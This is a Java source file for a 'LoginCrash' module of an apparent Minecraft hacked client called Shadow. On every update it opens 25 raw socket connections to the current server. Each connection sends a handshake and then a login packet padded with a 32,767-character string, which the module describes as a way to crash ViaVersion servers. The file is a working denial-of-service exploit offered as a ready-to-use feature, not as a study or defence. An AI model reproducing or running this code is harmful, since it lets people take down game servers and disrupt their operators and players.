package net.shadow.feature.module;

import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.LiteralText;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.utils.ChatUtils;

import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
import net.shadow.feature.base.Command;
import java.util.List;

import com.google.common.net.InetAddresses;

import java.awt.*;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;

import net.shadow.utils.ChatUtils;

public class LoginCrash extends Module {

    public void writeVarInt(DataOutputStream out, int paramInt) throws IOException {
        while (true) {
            if ((paramInt & 0xFFFFFF80) == 0) {
              out.writeByte(paramInt);
              return;
            }
    
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
    }

    public void writeString(DataOutputStream out, String string, Charset charset) throws IOException {
        byte [] bytes = string.getBytes(charset);
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    public LoginCrash() {
        super("LoginCrash", "crash via login packets on viaversion servers", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        InetSocketAddress connection = (InetSocketAddress) Shadow.c.player.networkHandler.getConnection().getAddress();
        ChatUtils.message("Sending Packets to " + connection.getHostName() + ":" + connection.getPort());
        for(int i = 0; i < 25; i++){
            try {
                Socket sock = new Socket(connection.getHostName(), connection.getPort());
                DataOutputStream out = new DataOutputStream(sock.getOutputStream());
    
                //handshake state 1
                ByteArrayOutputStream byteBuf = new ByteArrayOutputStream();
                DataOutputStream handshake_1 = new DataOutputStream(byteBuf);
                handshake_1.writeByte(0x00); //handshake packet id
                writeVarInt(handshake_1, 760); //protocol version 760 -> 1.19.2
                writeString(handshake_1, connection.getHostName(), StandardCharsets.UTF_8); //server IP
                handshake_1.writeShort(connection.getPort()); //server port
                writeVarInt(handshake_1, 2); //next state login
    
                //send handshake state 1
                byte[] buf = byteBuf.toByteArray();
                writeVarInt(out, buf.length);
                out.write(buf);
    
                //handshake state 2
                ByteArrayOutputStream byteBuf2 = new ByteArrayOutputStream();
                DataOutputStream handshake_2 = new DataOutputStream(byteBuf2);
                handshake_2.writeByte(0x00);
                handshake_2.writeUTF("A".repeat(32767));
                handshake_2.writeBoolean(false);
                handshake_2.writeBoolean(false);
    
                //send handshake 2
                byte[] buf2 = byteBuf2.toByteArray();
                writeVarInt(out, buf2.length);
                out.write(buf2);
    
                sock.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onRender() {

    }
}
